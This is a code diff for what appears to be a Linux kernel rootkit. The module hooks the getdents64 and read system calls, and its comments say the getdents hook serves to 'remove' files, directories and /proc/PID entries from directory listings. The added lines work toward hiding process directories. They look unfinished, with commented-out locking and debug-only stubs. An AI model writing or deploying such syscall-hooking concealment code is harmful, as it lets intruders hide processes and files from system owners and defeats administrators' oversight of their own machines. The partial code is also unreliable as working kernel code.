@@ -43,6 +43,9 @@ int clearDirEntries (struct linux_dirent64 *dirPtr, unsigned int len) {
 
 int newGetDents (unsigned int fd, struct linux_dirent64 *dirent, unsigned int count) {
 	int ret;
+	//struct files_struct *fdtPtr = NULL;
+	struct file *fdPtr = NULL;
+	struct dentry *dePtr = NULL;
 	
 	
 #ifdef MY_OWN_DEBUG
@@ -51,6 +54,39 @@ int newGetDents (unsigned int fd, struct linux_dirent64 *dirent, unsigned int co
 	
 	atomic64_inc (& ssPtr[SYS_DIRENT_NUM].numOfCalls);
 	if (ssPtr[SYS_DIRENT_NUM].sysPtrOld) {
+		//
+		// "Removing" directories from /proc/PID
+		//
+		//spin_lock (&current->alloc_lock);
+		//fdtPtr = current->files;
+		//spin_lock (&fdtPtr->file_lock);
+		if ((fdPtr = fget (fd)) == NULL) {
+#ifdef MY_OWN_DEBUG
+			printk ("Have found NULL ptr to struct file at FDT for descriptor id: %d\n", fd);
+#endif
+		} else {
+			if ((dePtr = fdPtr->f_path.dentry) != NULL) {
+				if (dePtr->d_iname [DNAME_INLINE_LEN - 1] != '\0')
+					dePtr->d_iname [DNAME_INLINE_LEN - 1] = '\0';
+#ifdef MY_OWN_DEBUG
+				printk ("HAVE FOUND A NAME: %s\n", dePtr->d_name.name);
+				//sys_write (1, "", 0);
+				//vfs_write ()
+				//vfs_readlink (NULL, "", 0, "");
+#endif
+			} else {
+#ifdef MY_OWN_DEBUG
+				printk ("Have found NULL ptr to struct dentry\n");
+#endif
+			}
+			fput (fdPtr);
+		}
+		//spin_unlock (&fdtPtr->file_lock);
+		//spin_unlock (&current->alloc_lock);
+		
+		//
+		// "Removing" ordinary files an directories
+		//
 		if ((ret = ((GETDENTS_P)(ssPtr[SYS_DIRENT_NUM].sysPtrOld)) (fd, dirent, count)) > 0) {
 			struct linux_dirent64 *dirPtr = (struct linux_dirent64*)kmalloc (ret, GFP_KERNEL);
 			
@@ -60,6 +96,7 @@ int newGetDents (unsigned int fd, struct linux_dirent64 *dirent, unsigned int co
 			
 			kfree (dirPtr);
 		}
+		
 		
 		atomic64_dec (& ssPtr[SYS_DIRENT_NUM].numOfCalls);
 		return ret;
@@ -76,7 +113,7 @@ ssize_t newRead (int fd, void *buf, size_t count) {
 	
 	
 #ifdef MY_OWN_DEBUG
-	printk ("Intercepted function sys_read\n");
+	//printk ("Intercepted function sys_read\n");
 #endif
 	
 	atomic64_inc (& ssPtr[SYS_READ_NUM].numOfCalls);
